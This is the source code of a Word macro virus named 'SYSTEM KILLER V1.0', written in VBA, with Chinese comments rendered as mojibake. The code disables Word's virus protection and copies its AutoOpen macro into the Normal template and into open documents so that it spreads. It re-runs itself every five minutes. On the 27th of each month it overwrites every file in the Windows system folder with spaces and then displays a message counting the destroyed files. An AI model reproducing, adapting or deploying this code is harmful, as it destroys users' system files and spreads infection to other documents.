   Attribute VB_Name = "AutoOpen"
   'The name is SYSTEM KILLER,Version 1.0

   Public Sub MAIN()
   Dim MyFile$
   Dim x
   Dim normal
   Dim OkExist
   Dim i
   Dim TemplateName$
   Dim active
   Dim internal
   Dim alarmtime
   Dim alarm$

   On Error GoTo PassErr

   Word.Options.VirusProtection = False
   If Day(Now()) = 27 Then OutBreak 'SYSTEM KILLER¼ÍÄîÈÕ
   'MsgBox Day(Now())

   'Èç¹ûÎ´´ò¿ªÈÎºÎÎÄµµÔòÔËÐÐbye2
   If Application.Documents.Count = 0 Then GoTo Bye2

   'ÉèÖÃÎÄµµÄ£Ê½
   Dim dlg As Object
   Set dlg = WordBasic.DialogRecord.FileSaveAs(False)

   '»ñÈ¡ÎÄ¼þÃû£¬±£´æÔÚMyFile$ÖÐ
   MyFile$ = WordBasic.[FileName$]()
   If InStr(1, MyFile$, "ÎÄµµ") = 1 Then
       x = WordBasic.Dialog.FileSaveAs(dlg)
       MyFile$ = dlg.Name
   Else
       WordBasic.CurValues.FileSaveAs dlg
       MyFile$ = dlg.Name
   End If

   'Èç¹ûÎªºêÎÄµµÔòÖ´ÐÐbye2
   If WordBasic.IsMacro(0) = -1 Then GoTo Bye2

   'Èç¹ûÎªÐÂÎÄµµÔòÖ´ÐÐbye1
   If MyFile$ = "" Then GoTo Bye1

   'ÒÔÄ£°å¸ñÊ½±£´æÎÄ¼þ
   If dlg.Format = 0 Then
       WordBasic.FileSaveAs Name:=MyFile$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
   Else
       WordBasic.FileSave
   End If

   'ÔÚNormalÄ£°åÖÐÑ°ÕÒAutoOpenºê£¬ÕÒµ½ÔòÖÃOkExist=1£¬·´Ö®ÔòÖÃOkExist=0
   normal = WordBasic.CountMacros(0)
   OkExist = 0
   For i = 1 To normal
       If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then OkExist = 1
   Next i

   '»ñÈ¡NormalÄ£°åµÄÃû³Æ
   TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"

   '°ÑAutoOpenºê¿½±´µ½NormalÄ£°åÖÐ
   If OkExist <> 1 Then
       WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Tab:=3
       'WordBasic.FileSaveAs Name:=TemplateName$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=0, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
   End If

   'ÔÚ»î¶¯ÎÄµµÖÐÑ°ÕÒAutoOpenºê£¬ÕÒµ½ÔòÖÃOkExist=1£¬·´Ö®ÔòÖÃOkExist=0
   active = WordBasic.CountMacros(1)
   OkExist = 0
   For i = 1 To active
       If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
   Next i

   '°ÑAutoOpenºê¿½±´µ½»î¶¯Ä£°åÖÐ
   If OkExist <> 1 Then
       WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Tab:=3
       WordBasic.FileSave
   End If

   'ÉèÖÃÐÂÎÄµµÄ£Ê½
   Bye1:
       dlg.Format = 0

   'ÉèÖÃ¶¨Ê±Æ÷ÒÔ±ãÔÙ´ÎÔËÐÐAutoOpenºê
   Bye2:
       internal = 5 / 24 / 60 ' internal time is 5 minutesÏµÍ³Ê±¼ä5·ÖÖÓ
       alarmtime = WordBasic.TimeValue(WordBasic.[Time$]()) + internal
       alarm$ = WordBasic.[Time$](alarmtime)
       WordBasic.OnTime alarm$, "AutoOpen"

   'Èç¹û³ö´íÔò´Ë´ÎÔËÐÐ²»ÔÙ´¦Àí
   PassErr:

   End Sub

   Private Sub OutBreak()
   Const MyPath$ = "C:\WINDOWS\SYSTEM\" 'Ö¸¶¨Â·¾¶
   Const Sorry$ = "Sorry,"
   Const MacroName$ = "SYSTEM KILLER V1.0Ê¹ "
   Const InYour$ = " ÖÐ,"
   Const Info$ = "¸öÎÄ¼þ±»ÆÆ»µ."

   Dim MyName() As String
   Dim i, j
   Dim FileNumber As Integer
   Dim PutSpace
   Dim TotalWrite As Integer

   i = 1
   ReDim MyName(1000)
   'ÕÒÑ°µÚÒ»Ïî
   MyName(i) = Dir(MyPath, 2) 'ÓÃ2ÕÒµ½Òþ²ØÎÄ¼þ
   '¿ªÊ¼Ñ»·
   Do While MyName(i) <> ""
       'MsgBox MyName(i)
       '½â¾öÎÄ¼þÊôÐÔÎÊÌâ
       If GetAttr(MyPath & MyName(i)) <> vbNormal Then SetAttr MyPath & MyName(i), vbNormal
       i = i + 1
       If i >= 500 Then ReDim Preserve MyName(UBound(MyName) + 100)
       '²éÕÒÏÂÒ»¸ö
       MyName(i) = Dir(, 2)
   Loop

   FileNumber = 1
   Total = 0
   '¿ªÊ¼¸ÄÐ´¹ý³Ì
   For j = 1 To i - 1
       On Error GoTo ErrNext
       Open MyPath & MyName(j) For Binary As #FileNumber
       'ÇåÎÄ¼þÎªn...¸ö...
       If LOF(FileNumber) < 5 Then PutSpace = 1 Else PutSpace = LOF(FileNumber) - 4 'Ð¡ÎÄ¼þ
       Put #FileNumber, 1, Space(PutSpace)
       TotalWrite = TotalWrite + 1
       Close #FileNumber
       FileNumber = FreeFile()
   ErrNext:
   Next j
       MsgBox Sorry & MacroName & MyPath & InYour & Str(TotalWrite) & Info

   End Sub
